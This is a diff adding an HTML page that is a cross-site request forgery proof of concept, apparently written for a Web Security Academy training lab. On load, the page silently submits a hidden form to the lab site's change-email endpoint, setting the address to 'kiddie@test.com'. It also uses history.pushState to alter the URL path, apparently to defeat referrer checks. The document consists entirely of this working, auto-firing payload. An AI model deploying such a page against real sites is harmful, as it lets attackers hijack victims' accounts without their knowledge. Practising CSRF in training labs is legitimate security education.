@@ -1,0 +1,12 @@
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+<form action="https://acc61f1a1feb8e0b8062c08e002d00c9.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
